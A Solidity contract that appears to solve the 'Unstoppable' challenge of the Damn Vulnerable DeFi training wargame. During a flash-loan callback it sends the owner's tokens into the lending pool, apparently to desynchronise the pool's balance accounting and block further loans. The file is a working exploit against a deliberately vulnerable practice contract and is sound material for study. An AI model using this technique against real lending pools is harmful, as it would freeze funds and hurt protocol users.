// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "../unstoppable/UnstoppableLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title AttackerUnstoppable
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackerUnstoppable {

    UnstoppableLender private immutable pool;
    address private immutable owner;

    constructor(address poolAddress) {
        pool = UnstoppableLender(poolAddress);
        owner = msg.sender;
    }

    // Pool will call this function during the flash loan
    function receiveTokens(address tokenAddress, uint256 amount) external {
        console.log("Owner balance:", IERC20(tokenAddress).balanceOf(owner));

        require(msg.sender == address(pool), "Sender must be pool");
        console.log("This balance:", IERC20(tokenAddress).balanceOf(address(this)));
        console.log("Pool balance:", IERC20(tokenAddress).balanceOf(msg.sender));

        uint256 owner_balance = IERC20(tokenAddress).balanceOf(owner);

        IERC20(tokenAddress).transferFrom(owner, msg.sender, owner_balance);

        // Return all tokens to the pool
        require(IERC20(tokenAddress).transfer(msg.sender, amount), "Transfer of tokens failed");
        console.log("Owner balance:", IERC20(tokenAddress).balanceOf(owner));
        console.log("This balance:", IERC20(tokenAddress).balanceOf(address(this)));
        console.log("Pool balance:", IERC20(tokenAddress).balanceOf(msg.sender));
    }

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        pool.flashLoan(amount);
    }
}